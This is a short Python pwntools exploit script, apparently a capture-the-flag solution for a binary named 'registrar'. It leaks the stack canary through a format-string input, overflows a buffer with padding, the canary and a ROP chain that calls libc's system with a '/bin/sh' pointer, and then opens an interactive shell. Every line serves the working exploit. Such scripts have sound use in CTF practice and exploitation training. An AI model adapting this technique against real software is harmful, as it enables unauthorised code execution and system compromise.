from pwn import *
leak = 0x00007fffffffecc0
#canary = leak+42
#print(hex(canary))
#canary = p64(0x00007fffffffecea)
#system = p64(0x00007ffff784e390)
system = 0x7ffff7a0d000+0x45390
print(hex(system))
shell = system + 0x1479c7
exit = p64(0x00007ffff7843030)
pop_rdi=p64(0x0000000000400bb3)
puts = p64(0x0000000000400776)
gets = p64(0x0000000000602028)

#sh = remote('challenge.acictf.com', 61713)
sh = process('./registrar', raw=False)
sh.recvline()
#payload = canary
sh.sendline("%19$lx")
sh.recvline()
canary = sh.recvline()
canary = canary.strip()
print(canary)
canary = int(canary, 16)
sh.recvuntil("name:")
payload = "a"*72
payload += p64(canary)
payload += "b"*8
payload += pop_rdi
#payload += gets
#payload += puts
payload += p64(shell)
payload += p64(system)
payload += exit
sh.sendline(payload)
sh.recvline()
#address = sh.recvline()
#address = int(unpack(address, 'all', endian = 'little', sign=False))
#print(hex(address))
sh.interactive()
